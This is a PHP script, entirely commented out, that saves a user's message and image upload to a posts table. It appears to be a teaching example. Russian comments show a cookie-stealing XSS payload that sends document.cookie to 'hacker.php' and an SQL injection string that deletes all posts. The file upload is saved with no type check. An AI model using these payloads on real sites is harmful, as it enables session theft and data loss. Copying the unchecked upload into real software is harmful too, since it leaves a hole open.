<?php

//require_once 'init.php';
//
//if (!isUserAuthorized()) {
//    // user not authorized
//    header('Location: registerForm.php');
//    die;
//}
//$DB = getDbConnection();
//
///**
// *  Вот такое сообщение украдёт куки
// * <script>
// * i = new Image(); i.src = "hacker.php/?" + document.cookie;
// * </script>
// */
//
//$message = htmlspecialchars($_POST['message']);
//$userId = $_SESSION['user_id'];
//$date = date('Y-m-d H:i:s');
//
//
//// такой код удалит все посты
//// rand message', '2012-01-01'); DELETE FROM posts;
//
//$query = "
//        INSERT
//            INTO posts
//            (
//                user_id,
//                message,
//                `datetime`
//            )
//            VALUES
//            (
//                $userId,
//                :placeholder,
//                '$date'
//            );";
//
////$ret = $DB->query($query);
//$prepared = $DB->prepare($query);
//$ret = $prepared->execute(['placeholder' => $message]);
//
//$postId = $DB->lastInsertId();
//if (!empty($_FILES['userfile']['tmp_name'])) {
//    $fileContent = file_get_contents($_FILES['userfile']['tmp_name']);
//    file_put_contents('../../images/'. $postId . '.png', $fileContent);
//}
//
//if(!$ret) {
//    print_r($DB->errorInfo());
//    echo 'Error';
//    die;
//}
//
//header('Location: index.php');